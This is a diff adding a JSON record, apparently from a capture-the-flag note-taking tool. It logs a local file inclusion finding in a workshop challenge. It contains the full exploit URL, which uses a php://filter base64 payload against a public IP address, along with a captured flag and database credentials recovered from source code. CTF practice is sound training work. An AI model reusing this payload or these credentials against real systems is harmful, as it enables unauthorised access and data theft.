@@ -1,0 +1,17 @@
+{
+  "target": "44.211.59.106",
+  "fingerprint": "3a4f6f329a607aa220441c251cb71348d1032a35e94e94b0e890dc4dfac8f8bb",
+  "validated_at": "2026-04-18T01:09:48.652Z",
+  "notes": "",
+  "snapshot": {
+    "type": "intel",
+    "prio": "high",
+    "value": "LFI em admin/restrita.php?input= — php://filter base64 em list.php",
+    "url": "http://44.211.59.106/admin/restrita.php?input=php://filter/convert.base64-encode/resource=list.php",
+    "meta": "Flag3 Solyd{f1ltters_f1llters__allow_source_read}; credenciais BD no código: tabata / tabata#123.",
+    "desafio": "CTF2_Workshop_Empreendedorismo",
+    "projectName": "CTF2_Workshop_Empreendedorismo"
+  },
+  "brainCategoryId": null,
+  "brainCategoryTitle": null
+}
